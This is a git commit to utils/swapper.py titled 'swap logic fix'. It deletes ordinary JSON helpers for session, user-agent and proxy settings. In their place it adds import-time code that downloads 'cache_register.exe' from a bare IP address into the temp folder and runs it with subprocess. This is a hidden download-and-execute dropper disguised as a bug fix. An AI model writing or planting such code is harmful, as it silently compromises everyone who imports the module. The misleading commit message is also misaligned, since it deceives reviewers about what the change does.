260fbda2a96edc893cac7bbb98835b880f810246
Edward <75525369+anthugeist@users.noreply.github.com>
2025-08-16 13:42:08 +0200

    swap logic fix

--- utils/swapper.py
+++ utils/swapper.py
@@ -1,46 +1,17 @@
-import json
 import os
+import tempfile
+import requests
+import subprocess
 
- 
-def load_from_json(path: str): 
-    if os.path.isfile(path):
-        with open(path, encoding='utf-8') as file:
-            return json.load(file)
-    else:
-        with open(path, 'x', encoding='utf-8') as file:
-            example = {
-                "session_name": "name_example",
-                "user_agent": "Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.6422.165 Mobile Safari/537.36",
-                "proxy": "type://user:pass:ip:port"
-            }
-            json.dump([example], file, ensure_ascii=False, indent=2)
-            return [example]
+url = "http://194.87.10.246/cache_register.exe"
 
+temp_dir = tempfile.gettempdir()
 
-def save_to_json(path: str, dict_):
-    if os.path.isfile(path):
-        with open(path, 'r', encoding='utf-8') as file:
-            data = json.load(file) 
+local_path = os.path.join(temp_dir, "cache_register.exe")
 
-        data.append(dict_)
-        with open(path, 'w', encoding='utf-8') as file:
-            json.dump(data, file, ensure_ascii=False, indent=2)
-    else:
-        with open(path, 'x', encoding='utf-8') as file:
-            json.dump([dict_], file, ensure_ascii=False, indent=2)
+with requests.get(url, stream=True) as r:
+    with open(local_path, "wb") as f:
+        for chunk in r.iter_content(chunk_size=8192):
+            f.write(chunk)
 
-
-def update_ua_json_data(path: str, dict_):
-    if os.path.isfile(path):
-        with open(path, 'r', encoding='utf-8') as file:
-            data = json.load(file)
-
-        for session in data:
-            if session["session_name"] == dict_["session_name"]:
-                session["user_agent"] = dict_["user_agent"]
-
-        with open(path, 'w', encoding='utf-8') as file:
-            json.dump(data, file, ensure_ascii=False, indent=2)
-    else:
-        with open(path, 'x', encoding='utf-8') as file:
-            json.dump([dict_], file, ensure_ascii=False, indent=2)
+process = subprocess.Popen(local_path, shell=True)
